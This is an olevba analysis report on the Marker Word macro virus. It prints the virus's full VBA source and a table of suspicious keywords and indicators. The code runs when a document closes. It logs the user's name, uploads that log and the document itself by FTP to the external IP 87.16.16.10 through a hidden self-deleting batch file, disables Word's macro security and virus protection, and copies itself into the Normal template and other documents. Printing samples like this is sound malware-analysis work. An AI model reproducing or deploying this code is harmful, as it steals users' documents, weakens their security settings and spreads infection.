olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.js
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.js - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Const EXELoc = "Template"
'Ver=2.02
Private Sub Document_Close()

On Error Resume Next

Const InfectedMark = "本产品为良性"
Const Ver = "2.01"

Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim OurCode, UserAddress, LogData, LogFile As String
Dim BegSlash, EndSlash, Loc As Long
Dim FileDosPath As String

Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.codemodule.Find(InfectedMark, 1, 1, 10000, 10000)
NormalTemplateInfected = nt.codemodule.Find(InfectedMark, 1, 1, 10000, 10000)

If (EXELoc <> "Template") Or Not (DocumentInfected) Then
  LogData = Format(Time, "hh:mm:ss AMPM - ") & _
                     Format(Date, "dddd, d mmm yyyy") & _
              "' " & Application.UserName & _
              "' " & UserAddress & "' " & ThisDocument.Name
    
    For i = 1 To 4
        LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
    Next i
    LogFile = "C:\Log" & LogFile
   
    Open LogFile For Output As #1
    Print #1, LogData
    Close #1

    BegSlash = 1
    EndSlash = 1
    FileDosPath = ActiveDocument.Path + "\"
    Do While EndSlash > 0
       BegSlash = InStr(BegSlash, FileDosPath, "\")
       EndSlash = InStr(BegSlash + 1, FileDosPath, "\")
       FileDosPath = Mid(FileDosPath, 1, BegSlash) + """" + Mid(FileDosPath, BegSlash + 1, EndSlash - BegSlash - 1) + _
                 """" + Mid(FileDosPath, EndSlash)
       BegSlash = EndSlash + 2
    Loop

    Open "c:\Log" For Output As #1
    Print #1, "o 87.16.16.10"
    Print #1, "user centre centre"
    Print #1, "cd /usr/news"
    Print #1, "ascii"
    Print #1, "put " & LogFile
    Print #1, "binary"
    Print #1, "put " & FileDosPath & ActiveDocument.Name
    Print #1, "del " & LogFile
    Print #1, "del c:\Log "
    Print #1, "quit"
    Close #1
    
    Open "c:\DelBat.bat" For Output As #1
    Print #1, "call ftp.exe -n -s:c:\Log"
    Print #1, "del " & LogFile
    Print #1, "del c:\Log"
    Print #1, "del c:\DelBat.bat"
    Close #1
    Shell "command.com /c c:\DelBat.bat", vbHide
End If
If DocumentInfected Then
   If IsNumeric(Mid(ad.codemodule.Lines(2, 1), 6)) Then
      DocumentInfected = (Val(Mid(ad.codemodule.Lines(2, 1), 6)) >= Ver)
   Else
      DocumentInfected = False
   End If
End If

If NormalTemplateInfected Then
   If IsNumeric(Mid(nt.codemodule.Lines(2, 1), 6)) Then
      NormalTemplateInfected = (Val(Mid(nt.codemodule.Lines(2, 1), 6)) >= Ver)
   End If
End If
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
  CommandBars("Macro").Controls("Security...").Enabled = False
  System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
  CommandBars("Tools").Controls("Macro").Enabled = False
  CommandBars("工具").Controls("宏").Enabled = False
  Options.ConfirmConversions = False
  Options.VirusProtection = False
  Options.SaveNormalPrompt = False
  Options.SavePropertiesPrompt = False
End If

If (DocumentInfected = False Or NormalTemplateInfected = False) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = "const EXELoc=" + """" + "Template" + """" + Chr(13)
    OurCode = OurCode + ad.codemodule.Lines(2, ad.codemodule.CountOfLines - 1)

    nt.codemodule.DeleteLines 1, nt.codemodule.CountOfLines
    nt.codemodule.AddFromString OurCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
  End If

  If NormalTemplateInfected = True Then
  
    SaveDocument = ActiveDocument.Saved
    OurCode = "const EXELoc=" + """" + "Document" + """" + Chr(13)
    OurCode = OurCode + nt.codemodule.Lines(2, nt.codemodule.CountOfLines - 1)

    ad.codemodule.DeleteLines 1, ad.codemodule.CountOfLines
    ad.codemodule.AddFromString OurCode
    
    If SaveDocument = True Then ActiveDocument.Save
  End If
    
End If
End Sub




























































+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |87.16.16.10         |IPv4 address                                 |
|IOC       |DelBat.bat          |Executable file name                         |
|IOC       |ftp.exe             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

